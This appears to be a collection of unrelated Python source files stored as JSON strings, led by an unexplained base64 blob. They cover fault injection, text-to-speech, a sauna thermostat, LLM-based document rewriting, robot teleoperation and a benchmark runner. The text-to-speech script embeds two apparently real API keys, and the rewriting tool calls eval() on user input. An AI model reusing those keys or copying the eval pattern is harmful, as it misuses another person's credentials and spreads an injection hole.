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",
    "import os\r\nimport random\r\nimport time\r\nfrom abc import ABC, abstractmethod\r\n\r\nfrom faker import Faker\r\nfrom model.user import User\r\n\r\n\r\nclass UserInterface(ABC):\r\n   @abstractmethod\r\n   def get_user(self, id: int) -> tuple[User|None, int]:\r\n        pass\r\n\r\n# simulates a database\r\nclass FakerClient(UserInterface):\r\n    def __init__(self):\r\n        self.faker = Faker()\r\n\r\n    def get_user(self, id: int) -> tuple[User|None, int]:\r\n        usr = User(\r\n            id = random.randint(1, 1000),\r\n            name = self.faker.name(),\r\n            address = self.faker.address()\r\n        )\r\n        return usr, 200\r\n\r\n# wraps another client for Application-level fault injection\r\nclass ChaosClient(UserInterface):\r\n    def __init__(self, client: UserInterface, base_delay: int = 50):\r\n        self.client = client\r\n        self.base_delay = base_delay\r\n        self.request_type = [\"fast\", \"medium\", \"slow\"]\r\n        self.request_probability = (.80, .15, .05)\r\n        self.request_latency = {\r\n            \"fast\": 100,\r\n            \"medium\": 300,\r\n            \"slow\": 2000,\r\n        }\r\n        self.response_status = [\"success\", \"fail\"]\r\n        self.response_code_probability = (.90, .10)\r\n\r\n    def get_user(self, id: int) -> tuple[User|None, int]:\r\n        faults_enabled = (os.getenv(\"CHAOS\", \"false\").lower() == \"true\")\r\n        if faults_enabled:\r\n            # add latency\r\n            additional_latency = self.request_latency[random.choices(self.request_type, self.request_probability)[0]]\r\n            time.sleep(self.base_delay/1000)\r\n            time.sleep(additional_latency/1000)\r\n\r\n            # choose status code\r\n            status = random.choices(self.response_status, self.response_code_probability)[0]\r\n            if status == \"success\":\r\n                return self.client.get_user(id)[0], 200\r\n            elif status == \"fail\":\r\n                return None, 404\r\n\r\n        return self.client.get_user(id)[0], 200",
    "from elevenlabs import Voice, VoiceSettings, play\r\nfrom elevenlabs.client import ElevenLabs\r\n\r\nclient = ElevenLabs(\r\n  api_key=\"7cca14c36c31fb428b03c649e3ae352e\", # Defaults to ELEVEN_API_KEY\r\n)\r\n\r\naudio = client.generate(\r\n    text=\"Juliana cara di banana\",\r\n    voice=Voice(\r\n        voice_id='tS45q0QcrDHqHoaWdCDR',\r\n        settings=VoiceSettings(stability=0.71, similarity_boost=0.5, style=0.0, use_speaker_boost=True)\r\n    )\r\n)\r\n\r\nplay(audio)\r\n\r\n\r\n\r\n\r\n\r\n# *********************\r\n\r\n\r\n# import pyttsx3\r\n\r\n# # Crie um objeto da classe pyttsx3\r\n# engine = pyttsx3.init()\r\n\r\n# # Texto a ser convertido em \u00e1udio\r\n# texto = \"Vai tomar banho\"\r\n\r\n# # Defina a propriedade de voz, se necess\u00e1rio\r\n# voices = engine.getProperty('voices')  # Obtenha todas as vozes dispon\u00edveis\r\n# # Voc\u00ea pode imprimir voices para ver todas as vozes dispon\u00edveis e escolher a que deseja usar\r\n# # Por exemplo, para usar a voz feminina, voc\u00ea pode definir engine.setProperty('voice', voices[1].id)\r\n# # Por padr\u00e3o, a voz masculina \u00e9 usada\r\n# # engine.setProperty('voice', voices[1].id)\r\n\r\n# # Converta o texto em fala e reproduza o \u00e1udio\r\n# engine.say(texto)\r\n# engine.runAndWait()\r\n\r\n\r\n\r\n# ***************************\r\n\r\n# import requests\r\n# import pygame\r\n# from io import BytesIO\r\n\r\n# pygame.init()\r\n\r\n# url = \"https://api.elevenlabs.io/v1/text-to-speech/tS45q0QcrDHqHoaWdCDR\"\r\n\r\n# headers = {\r\n#   \"Accept\": \"audio/mpeg\",\r\n#   \"Content-Type\": \"application/json\",\r\n#   \"xi-api-key\": \"a0aab2987f2437fcd3954ea9ce1c8a5f\"\r\n# }\r\n\r\n# data = {\r\n#   \"text\": \"esses caras s\u00e3o muito vagabundos\",\r\n#   \"model_id\": \"eleven_monolingual_v1\",\r\n#   \"voice_settings\": {\r\n#     \"stability\": 0.3,\r\n#     \"similarity_boost\": 0.5\r\n    \r\n#   }\r\n# }\r\n\r\n# response = requests.post(url, json=data, headers=headers)\r\n# if response.status_code == 200:\r\n#     audio_data = BytesIO(response.content)\r\n#     pygame.mixer.music.load(audio_data)\r\n#     pygame.mixer.music.play()\r\n#     while pygame.mixer.music.get_busy():\r\n#         pygame.time.Clock().tick(10)  # Verifique a cada 10 milissegundos se a m\u00fasica parou de tocar\r\n# else:\r\n#     print(\"Falha ao recuperar o \u00e1udio. C\u00f3digo de status:\", response.status_code)\r\n\r\n\r\n",
    "from homeassistant.components.climate import ClimateEntity\nfrom homeassistant.components.climate.const import HVACMode, ClimateEntityFeature\nfrom homeassistant.const import ATTR_TEMPERATURE, UnitOfTemperature\nfrom .constants import DOMAIN, STORAGE_KEY, STORAGE_VERSION, REGION,_LOGGER\n\nclass HarviaThermostat(ClimateEntity):\n    def __init__(self, device, name, sauna):\n        self._device = device\n        self._name = name + ' Thermostat'\n        self._current_temperature = None\n        self._target_temperature = None\n        self._hvac_mode = HVACMode.OFF\n        self._device_id = device.id + '_termostat'\n        self._sauna = sauna\n        self._attr_unique_id = device.id + '_termostat'\n\n    @property\n    def min_temp(self):\n        return 40\n\n    @property\n    def max_temp(self):\n        return 110\n\n    @property\n    def name(self):\n        return self._name\n\n    @property\n    def temperature_unit(self):\n        return UnitOfTemperature.CELSIUS\n\n    @property\n    def current_temperature(self):\n        return self._current_temperature\n\n    @property\n    def target_temperature(self):\n        return self._target_temperature\n\n    @property\n    def hvac_mode(self):\n        return self._hvac_mode\n\n    @property\n    def hvac_modes(self):\n        return [HVACMode.OFF, HVACMode.HEAT]\n\n    async def async_added_to_hass(self):\n        \"\"\"Acties die uitgevoerd moeten worden als entiteit aan HA is toegevoegd.\"\"\"\n        self._device.thermostat = self\n        await self._device.update_ha_devices()\n\n    async def async_set_temperature(self, **kwargs):\n        \"\"\"Stel de doeltemperatuur in.\"\"\"\n        if (temperature := kwargs.get(ATTR_TEMPERATURE)) is not None:\n            self._target_temperature = temperature\n            # Hier de logica om de doeltemperatuur in je apparaat te wijzigen\n            await self._device.set_target_temperature(temperature)\n            self.async_write_ha_state()\n\n    async def async_set_hvac_mode(self, hvac_mode):\n        \"\"\"Stel de HVAC-modus in.\"\"\"\n        active = False\n        self._hvac_mode = hvac_mode\n        self.async_write_ha_state()\n\n        if hvac_mode == HVACMode.HEAT:\n            await self._device.set_active(True)\n            active = True\n        elif hvac_mode == HVACMode.OFF:\n            await self._device.set_active(False)\n            active = False\n\n        if self._device.powerSwitch is not None:\n            self._device.powerSwitch._is_on = active\n            await self._device.powerSwitch.update_state()\n\n    @property\n    def supported_features(self):\n        return ClimateEntityFeature.TARGET_TEMPERATURE\n\n    async def update_state(self):\n        self.async_write_ha_state()\n\n    async def async_update(self):\n        \"\"\"Update de huidige staat van de thermostaat.\"\"\"\n        # Hier de logica om de huidige temperatuur en doeltemperatuur van je apparaat op te halen\n        #self._current_temperature = await self._device.fetch_current_temperature()\n        #self._target_temperature = await self._device.fetch_target_temperature()\n\nasync def async_setup_entry(hass, entry, async_add_entities):\n    \"\"\"Set up de Harvia theromostats.\"\"\"\n    # Hier zou je de logica toevoegen om je apparaten op te halen.\n    # Voor nu voegen we handmatig een schakelaar toe als voorbeeld.\n    devices = await hass.data[DOMAIN]['api'].get_devices()\n    theromostats = []\n\n    for device in devices:\n        _LOGGER.debug(f\"Loading theromostats for device: {device.name}\")\n        device_theromostats = await device.get_thermostats()\n        for device_theromostat in device_theromostats:\n            theromostats.append(device_theromostat)\n\n    async_add_entities(theromostats, True)\n",
    "import tkinter as tk\r\nfrom tkinter import ttk\r\nfrom tkinter import filedialog, messagebox\r\nimport threading\r\nfrom docx import Document\r\nimport erniebot\r\nimport os\r\nimport queue\r\nfrom openai import OpenAI\r\nfrom dashscope import Generation\r\nfrom http import HTTPStatus\r\nfrom docx.shared import Pt\r\nimport json\r\nimport dashscope\r\n\r\n# \u8bbe\u7f6e\u9ed8\u8ba4\u503c\r\ndefault_access_token = ''\r\ndefault_prompt = [\r\n    \"\u4f60\u662f\u4e00\u4e2a\u6587\u672c\u964d\u91cd\u673a\u5668\uff0c\u4f60\u53ea\u6267\u884c\u964d\u91cd\u6539\u5199 \u8bed\u5e8f\u98a0\u5012 \u987a\u5e8f\u8c03\u6362 \u540c\u4e49\u66ff\u6362 \u53e5\u5b50\u610f\u601d\u4e0d\u53d8 \u4e3b\u52a8\u53e5\u6539\u88ab\u52a8\u53e5 \u88ab\u52a8\u53e5\u6539\u4e3b\u52a8\u53e5 \u76f4\u63a5\u8f93\u51fa\u7ed3\u679c\",\r\n    \"\u4f60\u662f\u4e00\u4e2a\u6587\u672c\u6da6\u8272\u673a\u5668\uff0c\u4f60\u53ea\u6267\u884c\u6da6\u8272\u6587\u672c\u4f7f\u5176\u66f4\u6d41\u7545\u3001\u66f4\u5177\u5438\u5f15\u529b\u540c\u65f6\u4fdd\u7559\u539f\u610f \u53e5\u5b50\u610f\u601d\u4e0d\u53d8 \u76f4\u63a5\u8f93\u51fa\u7ed3\u679c\",\r\n    \"\u4f60\u662f\u4e00\u4e2a\u6587\u672c\u6821\u5bf9\u673a\u5668\uff0c\u4f60\u53ea\u6267\u884c\u6821\u5bf9\u6587\u5b57 \u6b63\u786e\u8868\u8fbe\u53e5\u5b50 \u4e0d\u80fd\u51fa\u73b0\u903b\u8f91\u9519\u8bef \u53e5\u5b50\u610f\u601d\u4e0d\u53d8 \u76f4\u63a5\u8f93\u51fa\u7ed3\u679c\"\r\n]\r\ndefault_min_paragraph_length = '100'\r\n\r\ndef call_chatgpt_thread(api_key, model, prompt, text, result_queue):\r\n    try:\r\n        client = OpenAI(\r\n            api_key=api_key,\r\n            base_url=\"https://chatgpt.24z.cn/v1\"\r\n        )\r\n        completion = client.chat.completions.create(\r\n            model=model,\r\n            messages=[\r\n                {\"role\": \"system\", \"content\": prompt},\r\n                {\"role\": \"user\", \"content\": text}\r\n            ]\r\n        )\r\n        response = completion.choices[0].message.content\r\n        result_queue.put(response.replace(\" \", \"\").replace(\"\\n\", \"\"))\r\n    except Exception as e:\r\n        result_queue.put(e)\r\n\r\ndef call_erniebot_thread(api_key, model, prompt, text, result_queue):\r\n    erniebot.api_type = 'aistudio'\r\n    erniebot.access_token = api_key\r\n    try:\r\n        response_stream = erniebot.ChatCompletion.create(\r\n            model=model,\r\n            messages=[{\r\n                'role': 'user',\r\n                'content': text\r\n            }],\r\n            system=prompt,\r\n            stream=True\r\n        )\r\n        result_queue.put(''.join([response.get_result() for response in response_stream]).replace(\" \", \"\").replace(\"\\n\", \"\"))\r\n    except Exception as e:\r\n        result_queue.put(e)\r\n\r\ndef call_qwen_thread(api_key, model, prompt, text, result_queue):\r\n    try:\r\n        dashscope.api_key =api_key\r\n        if model not in [\"qwen-1.8b-chat\", \"qwen-72b-chat\", \"qwen1.5-72b-chat\", \"qwen1.5-14b-chat\", \"qwen1.5-7b-chat\",\r\n                         \"qwen-14b-chat\", \"qwen-7b-chat\", \"qwen-1.8b-longcontext-chat\"]:\r\n            gen = Generation.call(\r\n                model=model,\r\n                messages=[\r\n                    {\"role\": \"system\", \"content\": prompt},\r\n                    {\"role\": \"user\", \"content\": text}\r\n                ],\r\n                result_format='message',\r\n                enable_search=True,\r\n                stream=True,\r\n                incremental_output=True\r\n            )\r\n        else:\r\n            gen = Generation.call(\r\n                model=model,\r\n                messages=[\r\n                    {\"role\": \"system\", \"content\": prompt},\r\n                    {\"role\": \"user\", \"content\": text}\r\n                ],\r\n                result_format='message',\r\n                stream=True,\r\n                incremental_output=True\r\n            )\r\n        resp = \"\"\r\n        for response in gen:\r\n            if response.status_code == HTTPStatus.OK:\r\n                response = response.output.choices[0].message.content\r\n                resp += response\r\n        response = resp\r\n\r\n        result_queue.put(response.replace(\" \", \"\").replace(\"\\n\", \"\"))\r\n    except Exception as e:\r\n        result_queue.put(e)\r\n\r\ndef call_ai(selected_option, api_key, model, prompt, text):\r\n    result_queue = queue.Queue()\r\n    if selected_option == \"\u6587\u5fc3\u4e00\u8a00\":\r\n        thread = threading.Thread(target=call_erniebot_thread, args=(api_key, model, prompt, text, result_queue))\r\n        thread.start()\r\n        return str(result_queue.get())\r\n    elif selected_option == \"\u901a\u4e49\u5343\u95ee\":\r\n        thread = threading.Thread(target=call_qwen_thread, args=(api_key, model, prompt, text, result_queue))\r\n        thread.start()\r\n        return str(result_queue.get())\r\n    else:\r\n        thread = threading.Thread(target=call_chatgpt_thread, args=(api_key, model, prompt, text, result_queue))\r\n        thread.start()\r\n        return str(result_queue.get())\r\n\r\ndef process_file():\r\n    selected_option = dropdown.get()\r\n    access_token_val = access_token.get().strip()\r\n    model_val = model_dropdown.get().strip()\r\n    prompt_val = prompt_var.get(\"1.0\", tk.END).strip()\r\n    min_paragraph_length_val = min_paragraph_length_var.get().strip()\r\n    file_path_val = input_file_path_var.get().strip()\r\n    \r\n    try:\r\n        file_path_val = eval(file_path_val)\r\n    except:\r\n        pass\r\n\r\n    if isinstance(file_path_val, str):\r\n        output_path = output_file_path_var.get().strip()\r\n        if not all([access_token_val, model_val, prompt_val, min_paragraph_length_val, file_path_val, output_path]):\r\n            messagebox.showwarning(\"\u63d0\u793a\", \"\u4e0d\u80fd\u4e3a\u7a7a\")\r\n        else:\r\n            min_paragraph_length = int(min_paragraph_length_val)\r\n            doc = Document(file_path_val)\r\n\r\n            if not any(style.name == 'Normal' for style in doc.styles):\r\n                doc_styles = doc.styles\r\n                new_style = doc_styles.add_style('Normal', 1)\r\n",
    "#! /usr/bin/env python3\n\nfrom __future__ import print_function\n\nimport threading\n\nimport roslib; roslib.load_manifest('teleop_twist_keyboard')\nimport rospy\n\nfrom geometry_msgs.msg import Twist\n\nimport sys, select, termios, tty\n\nmsg = \"\"\"\nReading from the keyboard  and Publishing to Twist!\n---------------------------\nMoving around:\n   u    i    o\n   j    k    l\n   m    ,    .\n\nFor Holonomic mode (strafing), hold down the shift key:\n---------------------------\n   U    I    O\n   J    K    L\n   M    <    >\n\nt : up (+z)\nb : down (-z)\n\nanything else : stop\n\nq/z : increase/decrease max speeds by 10%\nw/x : increase/decrease only linear speed by 10%\ne/c : increase/decrease only angular speed by 10%\n\n0~9 : switch the robot being controlled\n\nCTRL-C to quit\n\"\"\"\n\nmoveBindings = {\n        'i':(1,0,0,0),\n        'o':(1,0,0,-1),\n        'j':(0,0,0,1),\n        'l':(0,0,0,-1),\n        'u':(1,0,0,1),\n        ',':(-1,0,0,0),\n        '.':(-1,0,0,1),\n        'm':(-1,0,0,-1),\n        'O':(1,-1,0,0),\n        'I':(1,0,0,0),\n        'J':(0,1,0,0),\n        'L':(0,-1,0,0),\n        'U':(1,1,0,0),\n        '<':(-1,0,0,0),\n        '>':(-1,-1,0,0),\n        'M':(-1,1,0,0),\n        't':(0,0,1,0),\n        'b':(0,0,-1,0),\n    }\n\nspeedBindings={\n        'q':(1.1,1.1),\n        'z':(.9,.9),\n        'w':(1.1,1),\n        'x':(.9,1),\n        'e':(1,1.1),\n        'c':(1,.9),\n    }\n\nnumberBindings={\n        '0': 0,\n        '1': 1,\n        '2': 2,\n        '3': 3,\n        '4': 4,\n        '5': 5,\n        '6': 6,\n        '7': 7,\n        '8': 8,\n        '9': 9,\n}\n\nclass PublishThread(threading.Thread):\n    def __init__(self, rate):\n        super(PublishThread, self).__init__()\n        self.publisher = rospy.Publisher('/car0/cmd_vel', Twist, queue_size = 1)\n        self.x = 0.0\n        self.y = 0.0\n        self.z = 0.0\n        self.th = 0.0\n        self.speed = 0.0\n        self.turn = 0.0\n        self.condition = threading.Condition()\n        self.done = False\n\n        # Set timeout to None if rate is 0 (causes new_message to wait forever\n        # for new data to publish)\n        if rate != 0.0:\n            self.timeout = 1.0 / rate\n        else:\n            self.timeout = None\n\n        self.start()\n\n    def wait_for_subscribers(self):\n        i = 0\n        while not rospy.is_shutdown() and self.publisher.get_num_connections() == 0:\n            if i == 4:\n                print(\"Waiting for subscriber to connect to {}\".format(self.publisher.name))\n            rospy.sleep(0.5)\n            i += 1\n            i = i % 5\n        if rospy.is_shutdown():\n            raise Exception(\"Got shutdown request before subscribers connected\")\n\n    def update(self, x, y, z, th, speed, turn):\n        self.condition.acquire()\n        self.x = x\n        self.y = y\n        self.z = z\n        self.th = th\n        self.speed = speed\n        self.turn = turn\n        # Notify publish thread that we have a new message.\n        self.condition.notify()\n        self.condition.release()\n\n    def stop(self):\n        self.done = True\n        self.update(0, 0, 0, 0, 0, 0)\n        self.join()\n\n    def run(self):\n        twist = Twist()\n        while not self.done:\n            self.condition.acquire()\n            # Wait for a new message or timeout.\n            self.condition.wait(self.timeout)\n\n            # Copy state into twist message.\n            twist.linear.x = self.x * self.speed\n            twist.linear.y = self.y * self.speed\n            twist.linear.z = self.z * self.speed\n            twist.angular.x = 0\n            twist.angular.y = 0\n            twist.angular.z = self.th * self.turn\n\n            self.condition.release()\n\n            # Publish.\n            self.publisher.publish(twist)\n\n        # Publish stop message when thread exits.\n        twist.linear.x = 0\n        twist.linear.y = 0\n        twist.linear.z = 0\n        twist.angular.x = 0\n        twist.angular.y = 0\n        twist.angular.z = 0\n        self.publisher.publish(twist)\n\n\ndef getKey(key_timeout):\n    tty.setraw(sys.stdin.fileno())\n    rlist, _, _ = select.select([sys.stdin], [], [], key_timeout)\n    if rlist:\n        key = sys.stdin.read(1)\n    else:\n        key = ''\n    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, settings)\n    return key\n\n\ndef vels(speed, turn):\n    return \"currently:\\tspeed %s\\tturn %s \" % (speed,turn)\n\nif __name__==\"__main__\":\n    settings = termios.tcgetattr(sys.stdin)\n\n    rospy.init_node('teleop_twist_keyboard')\n\n    speed = rospy.get_param(\"~speed\", 0.5)\n    turn = rospy.get_param(\"~turn\", 1.0)\n    repeat = rospy.get_param(\"~repeat_rate\", 0.0)\n    key_timeout = rospy.get_param(\"~key_timeout\", 0.0)\n    if key_timeout == 0.0:\n        key_timeout = None\n\n    pub_thread = PublishThread(repeat)\n\n    x = 0\n    y = 0\n    z = 0\n    th = 0\n    status = 0\n\n    try:\n        pub_thread.wait_for_subscribers()\n        pub_thread.update(x, y, z, th, speed, turn)\n\n        print(msg)\n        print(vels(speed,turn))\n        while(1):\n            key = getKey(key_timeout)\n            if key in moveBindings",
    "import os\nimport json\nimport numpy as np\nimport benchmark_set_up as benchmarks\n\nfrom litellm import completion\nfrom tqdm import tqdm\n\n\n# Configuration\n# =============\nMODEL_NAME = (\n    \"gpt-4-0125-preview\"  # Specify the model to use. It doesn't need to be from OpenAI.\n)\nPubMedQALSWE_SYSTEM_PROMPT = \"Du \u00e4r en utm\u00e4rkt l\u00e4kare och skriver ett l\u00e4karprov. Var v\u00e4nlig och \u00f6verv\u00e4g varje aspekt av medicinska fr\u00e5gan nedan noggrant. Ta en stund, andas djupt, och n\u00e4r du k\u00e4nner dig redo, v\u00e4nligen svara med endast ett av: 'ja', 'nej', eller 'kanske'. Det \u00e4r viktigt att du begr\u00e4nsar ditt svar till dessa alternativ f\u00f6r att s\u00e4kerst\u00e4lla tydlighet i kommunikationen.\"\nBENCHMARKS = [\n    benchmarks.PubMedQALSWE(\n        prompt=PubMedQALSWE_SYSTEM_PROMPT\n        + \"\\n\\nFr\u00e5ga:\\n{question}\\n\\nSvara endast 'ja', 'nej' eller 'kanske'.\"\n    )\n]\nos.environ[\"OPENAI_API_KEY\"] = \"set-key-here\"  # Set your api key and key name. \n\n\n# Functions\n# =========\ndef get_response(messages: list[str]) -> str:\n    response = messages.choices[0].message\n    assert response[\"role\"] == \"assistant\"\n    return response[\"content\"].lower()\n\n\n# Main\n# ====\nif __name__ == \"__main__\":\n    result = {\n        \"llm_info\": {\n            \"model\": MODEL_NAME,\n        },\n    }\n    for benchmark in BENCHMARKS:\n        llm_results = []\n        ids = []\n        ground_truths = benchmark.get_ground_truth()\n\n        for k, v in tqdm(benchmark.data.items(), desc=f\"Processing {benchmark.name}\"):\n            messages = [\n                {\n                    \"role\": \"user\",\n                    \"content\": benchmark.prompt.format(question=v[\"QUESTION\"]),\n                }\n            ]\n            out = completion(\n                model=MODEL_NAME,\n                messages=messages,\n                max_tokens=10,\n            )\n            llm_results.append(get_response(out))\n            predictions = benchmark.detect_answers(llm_results)\n            ids.append(k)\n            result[benchmark.name] = {\n                \"prompt\": benchmark.prompt,\n                \"ground_truths\": ground_truths.tolist(),\n                \"predictions\": predictions.tolist(),\n                \"ids\": ids,\n            }\n            with open(\"./results.json\", \"w\") as f:\n                json.dump(result, f)\n\n        assert len(ground_truths) == len(predictions)\n\n        print(f\"Accuracy {(predictions == ground_truths).sum() / len(ground_truths)}\")\n        print(f\"Malformed answers {(predictions == 'missformat').sum()}\")\n\n    print(\n        \"Done! You can now run the evaluate_results.py script to get detailed performance metrics.\"\n    )\n",
    "##############################################################################\n#\n#  Test exceptions bindings.\n#\n#  This file is part of XAD's Python bindings, a comprehensive library for\n#  automatic differentiation.\n#\n#  Copyright (C) 2010-2024 Xcelerit Computing Ltd.\n#\n#  This program is free software: you can redistribute it and/or modify\n#  it under the terms of the GNU Affero General Public License as published\n#  by the Free Software Foundation, either version 3 of the License, or\n#  (at your option) any later version.\n#\n#  This program is distributed in the hope that it will be useful,\n#  but WITHOUT ANY WARRANTY; without even the implied warranty of\n#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#  GNU Affero General Public License for more details.\n#\n#  You should have received a copy of the GNU Affero General Public License\n#  along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nimport pytest\nfrom xad.adj_1st import Real, Tape\nfrom xad.exceptions import (\n    XadException,\n    TapeAlreadyActive,\n    OutOfRange,\n    DerivativesNotInitialized,\n    NoTapeException,\n)\n\n\n@pytest.mark.parametrize(\"exception\", [TapeAlreadyActive, XadException])\ndef test_exceptions_tape_active(exception):\n    with Tape() as t:\n        with pytest.raises(exception) as e:\n            # when it's already active\n            t.activate()\n        assert \"A tape is already active for the current thread\" in str(e)\n\n\n@pytest.mark.parametrize(\"exception\", [OutOfRange, XadException])\ndef test_exceptions_outofrange(exception):\n    with Tape() as t:\n        x = Real(1.0)\n        t.registerInput(x)\n        assert t.derivative(x) == 0.0\n        with pytest.raises(exception) as e:\n            t.derivative(12312)\n        assert \"given derivative slot is out of range - did you register the outputs?\" in str(e)\n\n\n@pytest.mark.parametrize(\"exception\", [DerivativesNotInitialized, XadException])\ndef test_exceptions_adjoints_not_initialized(exception):\n    with Tape() as t:\n        with pytest.raises(exception) as e:\n            x = Real(1.0)\n            t.registerInput(x)\n            t.newRecording()\n            y = x * x\n            t.registerOutput(y)\n            t.computeAdjoints()\n        assert \"At least one derivative must be set before computing adjoint\" in str(e)\n\n\n@pytest.mark.parametrize(\"exception\", [NoTapeException, XadException])\ndef test_exceptions_no_tape_exception(exception):\n    with pytest.raises(exception) as e:\n        x = Real(1.0)\n        x.setDerivative(1.0)\n    assert \"No active tape for the current thread\" in str(e)\n",
    "import torch\nimport torchvision\nimport pandas as pd\nimport numpy as np\nfrom fvcore.nn import flop_count_table, flop_count_str, FlopCountAnalysis\n\nfrom hiefed.client import init_network\n\n# functions used to compute MAC operations, communication amounts, latency, energy cost\nres_folder = \"results\"\n\n# train K M B text to numbers (used in plots)\ndef text_to_num(text, bad_data_val = 0):\n    d = {\n        'K': 1000,\n        'M': 1000000,\n        'G': 1000000000\n    }\n    if not isinstance(text, str):\n        return bad_data_val\n\n    elif text[-1] in d: # separate out the K, M, or B\n        num, magnitude = text[:-1], text[-1]\n        return int(float(num) * d[magnitude])\n    else:\n        try: # catch exceptions\n            return float(text)\n        except Exception as e:\n            return None\n\n\n# Dynamically generate column names\n# The max column count a line in the file could have\ndef read_file_imbalanced_col(data_file):\n   \n    largest_column_count = 0\n\n    # Loop the data lines\n    with open(data_file, 'r') as temp_f:\n        lines = temp_f.readlines()\n\n        for l in lines:\n            column_count = len(l.split(',')) + 1\n            largest_column_count = column_count if largest_column_count < column_count else largest_column_count\n\n    if largest_column_count > 20: largest_column_count = 20 + 3   # avoiding Error tokenizing data. C error: Buffer overflow caught - possible malformed input file.\n\n    # Generate column names (will be 0, 1, 2, ..., largest_column_count - 1)\n    column_names = ['dest','round','cid']\n    column_names = column_names + ['samples_e'+str(i) for i in range(1, largest_column_count-2)]\n\n    #print(data_file)\n    #if data_file == 'results/sample_number_dyn_1cifar10_2mobi_3medium_c8|100_e3_a5_b3_g0_flpa1000_mr0.1|0.4.csv':\n    #    import pdb; pdb.set_trace()\n    df = pd.read_csv(data_file, header=None, skiprows=1, delimiter=',', names=column_names, lineterminator='\\n')\n\n    return df\n\n\n# get flops using fvcore.nn library (from facebook AI)\ndef get_flops_parameters(Net, input):\n    flops = FlopCountAnalysis(Net, input)\n\n    flops_ = flop_count_table(flops)\n    flops_ = flops_.replace(' ','')\n    flops_ = flops_.replace('|',';')\n    flops_ = flops_.replace(';\\n;','\\n')\n    flops_ = flops_.replace('-','')\n    flops_ = flops_.replace('\\n:;:;:\\n','\\n')\n\n    flops_ = flops_[1:]\n    flops_ = flops_[:-1]\n\n    with open(res_folder + \"/model_flops.csv\",\"w\") as f:\n        f.write(flops_)\n    \n    dat = pd.read_csv(res_folder + \"/model_flops.csv\", sep=\";\")\n    return dat\n\n\ndef get_input_size(encoder, classifier):\n    '''input sizes for encoders when computing FLOPs and weights'''\n    \n    if  encoder == 'sencoder_p':\n        input = torch.rand(16, 1, 27, 200)\n    elif  encoder == 'sencoder_u' or encoder == 'sencoder_m':\n        input = torch.rand(16, 1, 9, 128)\n    else:\n        input = torch.rand(16, 3, 3, 3)\n    \n    if encoder == 'mobilenet' or encoder == 'efficientnet':\n        classifier_str = 'classifier.0'\n        encoder_str = 'features'\n\n    elif  encoder == 'mnasnet':\n        classifier_str = 'classifier'\n        encoder_str = 'layers'\n    \n    elif encoder == 'shufflenet':\n        classifier_str = 'fc'\n        encoder_str = None\n    elif  encoder == 'sencoder_p' or encoder == 'sencoder_u' or encoder == 'sencoder_m':\n        classifier_str = 